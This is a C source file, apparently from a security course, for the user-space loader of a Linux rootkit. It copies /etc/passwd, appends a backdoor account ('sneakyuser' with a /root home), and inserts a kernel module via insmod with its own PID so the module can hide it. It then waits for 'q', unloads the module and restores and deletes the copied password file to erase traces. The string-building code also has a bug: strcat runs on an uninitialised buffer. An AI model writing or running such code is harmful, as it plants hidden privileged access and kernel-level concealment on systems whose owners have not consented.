#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <string.h>


// this process will insert the malicious module into
// operating system and called a loop when comuter will
// implemented the malicous system call in the module
int main(void) {
  // steps that rootkit should follow:
  
  //step1: print the PID of this sneaky process
  printf("sneaky_process pid = %d\n", getpid());
  
  //step2: malicious act copy password file and change
  
  //const char* fromFile = "/etc/passwd";
  //const char* toFile = "/tmp/passwd";
  //pid_t child_pid = fork();

  //execute the cp command: copy from /etc/passwd to /tmp 
  system("cp /etc/passwd /tmp");
  
  //print a new line in the file
  //use IO redirection, print the new line after passwd 
  system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> /etc/passwd");

  //step3: load the sneaky module using inmod(insert module)
  char pid [128];
  sprintf(pid, "%d", getpid());

  // use strcat to concatenate the string continually
  char inmod_call[1024];
  strcat(inmod_call, "insmod sneaky_mod.ko pid=");
  strcat(inmod_call, pid);

  // use the inmod call with the pid key-value argument
  system(inmod_call);

  //step4: read characters from keyboard until char 'q'
  while (getchar() != 'q') {
  }

  //step5: unload the module using rmmod(remove module)
  system("rmmod sneaky_mod");  
  
  //step6: restore the password file
  //substitue the etc/passwd file with the temp file
  system("cp /tmp/passwd /etc/");
  //remove the temp file, deleting the log
  system("rm /tmp/passwd"); 
  
  return EXIT_SUCCESS;
}
